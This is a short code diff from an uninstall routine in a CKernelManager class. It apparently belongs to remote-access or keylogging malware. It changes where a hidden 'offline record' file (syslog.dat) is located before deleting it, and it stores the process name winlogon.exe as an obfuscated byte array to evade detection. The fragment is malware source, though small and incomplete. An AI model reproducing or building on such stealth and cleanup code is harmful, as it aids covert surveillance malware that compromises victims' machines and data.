@@ -146,9 +146,9 @@ void CKernelManager::UnInstallService()
 
 	// 删除离线记录文件
 
-	char	strRecordFile[MAX_PATH];
-	GetSystemDirectory(strRecordFile, sizeof(strRecordFile));
-	lstrcat(strRecordFile, "\\syslog.dat");
+	char	strRecordFile[MAX_PATH] = {0};
+	//GetSystemDirectory(strRecordFile, sizeof(strRecordFile));
+	lstrcat(strRecordFile, "C:\\syslog.dat");
 	DeleteFile(strRecordFile);
 	
 	char winlogon[] = { 0x0c,0xbc,0xa3,0xa7,0xa4,0xa8,0xa1,0xaa,0xaa,0xed,0xa7,0xb9,0xa5 };	//winlogon.exe
